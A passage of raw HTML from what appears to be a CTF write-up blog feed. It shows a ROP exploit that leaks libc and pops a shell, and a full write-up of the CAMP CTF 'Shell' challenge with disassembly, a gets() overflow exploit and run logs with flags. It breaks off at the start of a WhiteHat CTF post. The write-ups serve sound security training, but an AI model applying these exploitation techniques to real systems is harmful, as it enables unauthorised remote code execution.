<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
<span class='line-number'>77</span>
<span class='line-number'>78</span>
<span class='line-number'>79</span>
<span class='line-number'>80</span>
<span class='line-number'>81</span>
<span class='line-number'>82</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="c">#!/usr/bin/python</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">struct</span><span class="o">,</span> <span class="nn">time</span>
</span><span class='line'><span class="kn">from</span> <span class="nn">socket</span> <span class="kn">import</span> <span class="o">*</span>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">q</span><span class="p">(</span><span class="n">x</span><span class="p">):</span>
</span><span class='line'>  <span class="k">return</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s">&quot;&lt;Q&quot;</span><span class="p">,</span> <span class="n">x</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">readtil</span><span class="p">(</span><span class="n">delim</span><span class="p">):</span>
</span><span class='line'>  <span class="n">buf</span> <span class="o">=</span> <span class="n">b</span><span class="s">&#39;&#39;</span>
</span><span class='line'>  <span class="k">while</span> <span class="ow">not</span> <span class="n">delim</span> <span class="ow">in</span> <span class="n">buf</span><span class="p">:</span>
</span><span class='line'>      <span class="n">buf</span> <span class="o">+=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
</span><span class='line'>  <span class="k">return</span> <span class="n">buf</span>
</span><span class='line'>
</span><span class='line'><span class="n">payload</span> <span class="o">=</span> <span class="s">&quot;A&quot;</span><span class="o">*</span><span class="mi">136</span>   <span class="c"># ty Swappage!</span>
</span><span class='line'>
</span><span class='line'><span class="sd">&#39;&#39;&#39;</span>
</span><span class='line'><span class="sd">0x000002bc : pop r12; pop r13; pop r14; pop r15; ret</span>
</span><span class='line'><span class="sd">0x000002b6 : xor ebx, ebx; nop [rax + rax]; mov rdx, r13; mov rsi, r14; mov edi, r15d; call [r12 + rbx*8]</span>
</span><span class='line'><span class="sd">0x00000060 : pop rbp; ret</span>
</span><span class='line'><span class="sd">&#39;&#39;&#39;</span>
</span><span class='line'>
</span><span class='line'><span class="n">base</span> <span class="o">=</span> <span class="mh">0x400590</span>
</span><span class='line'><span class="c"># prologue, needed for later!</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">q</span><span class="p">(</span><span class="mh">0x00000060</span><span class="o">+</span><span class="n">base</span><span class="p">)</span>    <span class="c"># pop rbp ; ret</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">q</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>    <span class="c"># value for rbp</span>
</span><span class='line'>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">q</span><span class="p">(</span><span class="mh">0x000002dc</span><span class="o">+</span><span class="n">base</span><span class="p">)</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">q</span><span class="p">(</span><span class="mh">0x600c70</span><span class="p">)</span>  <span class="c"># value for r12 -&gt; puts@got</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">q</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>         <span class="c"># value for r13 -&gt; goes into rdx </span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">q</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>            <span class="c"># value for r14 -&gt; goes into rsi</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">q</span><span class="p">(</span><span class="mh">0x600c70</span><span class="p">)</span>  <span class="c"># value for r15 -&gt; goes into rdi -&gt; leak addr of puts()</span>
</span><span class='line'>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">q</span><span class="p">(</span><span class="mh">0x000002b6</span><span class="o">+</span><span class="n">base</span><span class="p">)</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">q</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">*</span> <span class="mi">7</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">q</span><span class="p">(</span><span class="mh">0x400570</span><span class="p">)</span>  <span class="c"># fflush@plt</span>
</span><span class='line'>
</span><span class='line'><span class="c"># now read() to overwrite printf()</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">q</span><span class="p">(</span><span class="mh">0x00000060</span><span class="o">+</span><span class="n">base</span><span class="p">)</span>    <span class="c"># pop rbp ; ret</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">q</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>    <span class="c"># value for rbp</span>
</span><span class='line'>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">q</span><span class="p">(</span><span class="mh">0x000002dc</span><span class="o">+</span><span class="n">base</span><span class="p">)</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">q</span><span class="p">(</span><span class="mh">0x600c80</span><span class="p">)</span>  <span class="c"># value for r12 -&gt; read@got</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">q</span><span class="p">(</span><span class="mi">8</span><span class="p">)</span>         <span class="c"># value for r13 -&gt; goes into rdx -&gt; count</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">q</span><span class="p">(</span><span class="mh">0x600c70</span><span class="p">)</span> <span class="c"># value for r14 -&gt; goes into rsi -&gt; overwrite printf()</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">q</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>         <span class="c"># value for r15 -&gt; goes into rdi -&gt; 0 -&gt; stdin</span>
</span><span class='line'>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">q</span><span class="p">(</span><span class="mh">0x000002b6</span><span class="o">+</span><span class="n">base</span><span class="p">)</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">q</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">*</span> <span class="mi">7</span>
</span><span class='line'>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">q</span><span class="p">(</span><span class="mh">0x4006ec</span><span class="p">)</span> <span class="c"># restart, so the binary will execute puts() -&gt; one shot rce, lands a shell</span>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">pwn</span><span class="p">():</span>
</span><span class='line'>  <span class="k">global</span> <span class="n">s</span>
</span><span class='line'>  <span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">SOCK_STREAM</span><span class="p">)</span>
</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="s">&#39;challs.campctf.ccc.ac&#39;</span><span class="p">,</span> <span class="mi">10106</span><span class="p">))</span>
</span><span class='line'>  <span class="c">#s.connect((&#39;localhost&#39;, 4444))</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">print</span> <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;name?&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&#39;a</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="k">print</span> <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;message:&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&#39;-1</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">)</span>   <span class="c"># ty Swappage!</span>
</span><span class='line'>  <span class="k">print</span> <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;text:&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="o">+</span><span class="s">&#39;</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="k">print</span> <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;Thanks!</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">)</span>
</span><span class='line'>  
</span><span class='line'>  <span class="n">data</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">8</span><span class="p">)</span>
</span><span class='line'>  <span class="n">data</span> <span class="o">=</span> <span class="n">data</span><span class="p">[:</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span> <span class="o">+</span> <span class="s">&quot;</span><span class="se">\x00\x00</span><span class="s">&quot;</span>
</span><span class='line'>  
</span><span class='line'>  <span class="n">puts_addr</span> <span class="o">=</span> <span class="n">struct</span><span class="o">.</span><span class="n">unpack</span><span class="p">(</span><span class="s">&#39;&lt;Q&#39;</span><span class="p">,</span> <span class="n">data</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>
</span><span class='line'>  <span class="k">print</span> <span class="s">&quot;[+] Leaked puts(): &quot;</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">struct</span><span class="o">.</span><span class="n">unpack</span><span class="p">(</span><span class="s">&#39;&lt;Q&#39;</span><span class="p">,</span> <span class="n">data</span><span class="p">)[</span><span class="mi">0</span><span class="p">])</span>
</span><span class='line'>  <span class="n">libc_base</span> <span class="o">=</span> <span class="n">puts_addr</span> <span class="o">-</span> <span class="mh">0x70a30</span>
</span><span class='line'>  <span class="k">print</span> <span class="s">&quot;[+] libc base addr: &quot;</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">libc_base</span><span class="p">)</span>
</span><span class='line'>  <span class="n">system_addr</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0x442AA</span> <span class="c"># one shot rce, ty superkojiman!</span>
</span><span class='line'>  <span class="k">print</span> <span class="s">&quot;[+] sending one shot rce addr (&quot;</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">system_addr</span><span class="p">)</span> <span class="o">+</span> <span class="s">&quot;)&quot;</span>
</span><span class='line'>  
</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">q</span><span class="p">(</span><span class="n">system_addr</span><span class="p">))</span>
</span><span class='line'>  
</span><span class='line'>  <span class="kn">import</span> <span class="nn">telnetlib</span>
</span><span class='line'>  <span class="n">t</span> <span class="o">=</span> <span class="n">telnetlib</span><span class="o">.</span><span class="n">Telnet</span><span class="p">()</span>
</span><span class='line'>  <span class="n">t</span><span class="o">.</span><span class="n">sock</span> <span class="o">=</span> <span class="n">s</span>
</span><span class='line'>  <span class="n">t</span><span class="o">.</span><span class="n">interact</span><span class="p">()</span>
</span><span class='line'><span class="n">pwn</span><span class="p">()</span>
</span></code></pre></td></tr></table></div></figure>


<p>And in action:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>bas@tritonal:~/bin/ccc/phobos<span class="nv">$ </span>python poc2.py
</span><span class='line'>&gt; What<span class="err">&#39;</span>s your name?
</span><span class='line'>
</span><span class='line'>Hi, a
</span><span class='line'>&lt;randomjunk&gt;
</span><span class='line'>&gt; Please input the length of your message:
</span><span class='line'>
</span><span class='line'>&gt; Please enter your text:
</span><span class='line'>
</span><span class='line'>&gt; Thanks!
</span><span class='line'>
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> Leaked puts<span class="o">()</span>: 0x7fa6830dda30
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> libc base addr: 0x7fa68306d000
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> sending one shot rce addr <span class="o">(</span>0x7fa6830b12aa<span class="o">)</span>
</span><span class='line'>id
</span><span class='line'><span class="nv">uid</span><span class="o">=</span>1001<span class="o">(</span>challenge<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1001<span class="o">(</span>challenge<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1001<span class="o">(</span>challenge<span class="o">)</span>
</span><span class='line'>cat flag.txt
</span><span class='line'>CAMP15_0ae754f04a8782cba9a7ec2c69dc1274
</span></code></pre></td></tr></table></div></figure>


<p>It&rsquo;s quite nice to solve a 400 point challenge only to find out we can use nearly the same solution for an additional 300 points!</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[CAMP CTF - Shell]]></title>
    <link href="http://barrebas.github.io/blog/2015/08/18/camp-ctf-shell/"/>
    <updated>2015-08-18T21:30:07+02:00</updated>
    <id>http://barrebas.github.io/blog/2015/08/18/camp-ctf-shell</id>
    <content type="html"><![CDATA[<p>shell was a pwnable from CAMP CTF. We&rsquo;re given a 64-bit ELF binary, which shows the following when executed:</p>

<!--more-->




<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>bas@tritonal:~/bin/ccc/shell<span class="nv">$ </span>./shell
</span><span class='line'><span class="nv">$ </span><span class="nb">help</span>
</span><span class='line'>sh whoami date <span class="nb">exit </span>ls <span class="nb">help </span>hlep login
</span><span class='line'><span class="nv">$ </span>sh
</span><span class='line'>Permission denied
</span><span class='line'><span class="nv">$ </span>login
</span><span class='line'>Username: AAAA
</span><span class='line'>Password: BBBB
</span><span class='line'>Authentication failed!
</span><span class='line'><span class="nv">$ </span>
</span></code></pre></td></tr></table></div></figure>


<p>Furthermore, the output of <code>strings ./shell</code> shows that the binary is looking for <code>creds.txt</code>. I placed a file in the same directory with <code>admin:admin</code> as sole line and indeed, I could now login:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>login
</span><span class='line'>Username: admin
</span><span class='line'>Password: admin
</span><span class='line'>Authenticated!
</span><span class='line'><span class="c"># sh</span>
</span><span class='line'><span class="err">$</span>
</span></code></pre></td></tr></table></div></figure>


<p>So we&rsquo;ll need to login with valid credentials, which we do not have yet. The rest of the commands are not of interest. Let&rsquo;s have a look at the disassembly, specifically at the part where our input is processed:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>  400c2a:    movabs rdi,0x400f89
</span><span class='line'>  400c34: mov    al,0x0
</span><span class='line'>  400c36: call   <span class="m">400750</span> &lt;<span class="nb">printf</span>@plt&gt;
</span><span class='line'>  <span class="p">;</span> this is the buffer it<span class="err">&#39;</span>s using
</span><span class='line'>  400c3b: lea    rdi,<span class="o">[</span>rbp-0x80<span class="o">]</span>             
</span><span class='line'>  400c3f: add    rdi,0x4
</span><span class='line'>  400c46: mov    DWORD PTR <span class="o">[</span>rbp-0xd0<span class="o">]</span>,eax
</span><span class='line'>  400c4c: mov    al,0x0
</span><span class='line'>  <span class="p">;</span> here we get the username
</span><span class='line'>  400c4e: call   <span class="m">400790</span> &lt;gets@plt&gt;
</span><span class='line'>  400c53: movabs rdi,0x400f94
</span><span class='line'>  400c5d: mov    DWORD PTR <span class="o">[</span>rbp-0xd4<span class="o">]</span>,eax
</span><span class='line'>  400c63: mov    al,0x0
</span><span class='line'>  400c65: call   <span class="m">400750</span> &lt;<span class="nb">printf</span>@plt&gt;
</span><span class='line'>  <span class="p">;</span> this is the buffer <span class="k">for</span> password
</span><span class='line'>  400c6a: lea    rdi,<span class="o">[</span>rbp-0x80<span class="o">]</span>
</span><span class='line'>  400c6e: add    rdi,0x24
</span><span class='line'>  400c75: mov    DWORD PTR <span class="o">[</span>rbp-0xd8<span class="o">]</span>,eax
</span><span class='line'>  400c7b: mov    al,0x0
</span><span class='line'>  400c7d: call   <span class="m">400790</span> &lt;gets@plt&gt;
</span><span class='line'>  400c82: movabs rsi,0x400f9f
</span><span class='line'>  <span class="p">;</span> i suppose I can overwrite this value
</span><span class='line'>  400c8c: mov    rdi,QWORD PTR <span class="o">[</span>rbp-0x18<span class="o">]</span>       <span class="p">;</span> creds.txt
</span><span class='line'>  400c90: mov    DWORD PTR <span class="o">[</span>rbp-0xdc<span class="o">]</span>,eax
</span><span class='line'>  400c96: call   4007b0 &lt;fopen@plt&gt;
</span></code></pre></td></tr></table></div></figure>


<p>So basically, the calls to <code>gets()</code> happen to write to the stack. We&rsquo;re not able to overwrite the saved return address because of the canary, but we can overwrite the pointer at <code>[rbp-0x18]</code>, which contains a pointer to the string <code>creds.txt</code>. We can overwrite this with a pointer to another string, to make the binary open another file to check our credentials!</p>

<p>The only option that I could find was <code>/lib64/ld-linux-x86-64.so.2</code>. The problem is, does this actually contain valid pairs of <code>user:name</code>? I grabbed the file via a shell I obtained on bitterman and ran it through strings:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>bas@tritonal:~/bin/ccc/shell<span class="nv">$ </span>strings ./ld.so <span class="p">|</span>grep <span class="s2">&quot;:&quot;</span>
</span><span class='line'><span class="p">|</span>F:m
</span><span class='line'>&lt;:uR
</span><span class='line'>sHu:H9
</span><span class='line'>...snip...
</span><span class='line'>FATAL: kernel too old
</span><span class='line'>Unused direct dependencies:
</span><span class='line'>  Version information:
</span><span class='line'>  %s:
</span><span class='line'>prelink checking: %s
</span><span class='line'>wrong ELF class: ELFCLASS32
</span><span class='line'>undefined symbol:
</span><span class='line'>relocation processing: %s%s
</span><span class='line'>...snip...
</span></code></pre></td></tr></table></div></figure>


<p>Indeed, it does! So the plan is to overwrite the pointer on the stack with the pointer to <code>/lib64/ld-linux-x86-64.so.2</code>, then login with one of those combinations of &ldquo;username&rdquo; and &ldquo;password&rdquo;. The exploit:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="c">#!/usr/bin/python</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">struct</span><span class="o">,</span> <span class="nn">time</span>
</span><span class='line'><span class="kn">from</span> <span class="nn">socket</span> <span class="kn">import</span> <span class="o">*</span>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">q</span><span class="p">(</span><span class="n">x</span><span class="p">):</span>
</span><span class='line'>  <span class="k">return</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s">&quot;&lt;Q&quot;</span><span class="p">,</span> <span class="n">x</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">readtil</span><span class="p">(</span><span class="n">delim</span><span class="p">):</span>
</span><span class='line'>  <span class="n">buf</span> <span class="o">=</span> <span class="n">b</span><span class="s">&#39;&#39;</span>
</span><span class='line'>  <span class="k">while</span> <span class="ow">not</span> <span class="n">delim</span> <span class="ow">in</span> <span class="n">buf</span><span class="p">:</span>
</span><span class='line'>      <span class="n">buf</span> <span class="o">+=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
</span><span class='line'>  <span class="k">return</span> <span class="n">buf</span>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">pwn</span><span class="p">():</span>
</span><span class='line'>  <span class="k">global</span> <span class="n">s</span>
</span><span class='line'>  <span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">SOCK_STREAM</span><span class="p">)</span>
</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="s">&#39;challs.campctf.ccc.ac&#39;</span><span class="p">,</span> <span class="mi">10117</span><span class="p">))</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;$&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&#39;login</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;Username:&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&#39;AAAA</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;Password:&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="c"># overwrite rbp-0x18, which used to contain a pointer to &quot;creds.txt&quot;</span>
</span><span class='line'>  <span class="c"># overwrite it with a pointer to 0x400200 (&quot;/lib64/ld-linux-x86-64.so.2&quot;)</span>
</span><span class='line'>  <span class="c"># I harvested this file already via one of the other challenges</span>
</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&quot;A&quot;</span><span class="o">*</span><span class="mi">68</span><span class="o">+</span><span class="n">q</span><span class="p">(</span><span class="mh">0x400200</span><span class="p">)</span><span class="o">+</span><span class="s">&#39;</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">)</span>
</span><span class='line'>  
</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;$&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&#39;login</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;Username:&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&#39;relocation processing</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;Password:&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&#39; </span><span class="si">%s%s</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">)</span>
</span><span class='line'>  
</span><span class='line'>  <span class="kn">import</span> <span class="nn">telnetlib</span>
</span><span class='line'>  <span class="n">t</span> <span class="o">=</span> <span class="n">telnetlib</span><span class="o">.</span><span class="n">Telnet</span><span class="p">()</span>
</span><span class='line'>  <span class="n">t</span><span class="o">.</span><span class="n">sock</span> <span class="o">=</span> <span class="n">s</span>
</span><span class='line'>  <span class="n">t</span><span class="o">.</span><span class="n">interact</span><span class="p">()</span>
</span><span class='line'><span class="n">pwn</span><span class="p">()</span>
</span></code></pre></td></tr></table></div></figure>


<p>And it action:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>bas@tritonal:~/bin/ccc/shell<span class="nv">$ </span>python ./poc.py
</span><span class='line'> Authenticated!
</span><span class='line'><span class="c"># id</span>
</span><span class='line'>Command not found
</span><span class='line'><span class="c"># sh</span>
</span><span class='line'>ls
</span><span class='line'>creds.txt
</span><span class='line'>flag.txt
</span><span class='line'>run.sh
</span><span class='line'>shell
</span><span class='line'>cat flag.txt
</span><span class='line'>CAMP15_408eed038796cfca32e2fdb3a8126429
</span></code></pre></td></tr></table></div></figure>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[WhiteHat CTF - Pwn100]]></title>
    <link href="http://barrebas.github.io/blog/2015/07/25/whitehat-ctf-pwn100/"/>
    <updated>2015-07-25T21:17:14+02:00</updated>
    <id>http://barrebas.github.io/blog/2015/07/25/whitehat-ctf-pwn100</id>
    <content type="html"><![CDATA[<p>This CTF lasted only twelve hours. I focused on the pwnables, this one was worth 100 points but could&rsquo;ve been way more!</p>

<!--more-->


<p>We&rsquo;re given a zip file containing a binary and the correspondig libc.so. How nice!</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>bas@tritonal:~/tmp/wh/pwn100<span class="nv">$ </span>file pwn100
</span><span class='line'>pwn100: ELF 32-bit LSB executable, Intel 80386, version <span class="m">1</span> <span class="o">(</span>SYSV<span class="o">)</span>, dynamically linked <span class="o">(</span>uses shared libs<span class="o">)</span>, <span class="k">for</span> GNU/Linux 2.6.24, BuildID<span class="o">[</span>sha1<span class="o">]=</span>0xce8e5ce254c2d733d19d9435903aff3656bef10e, not stripped
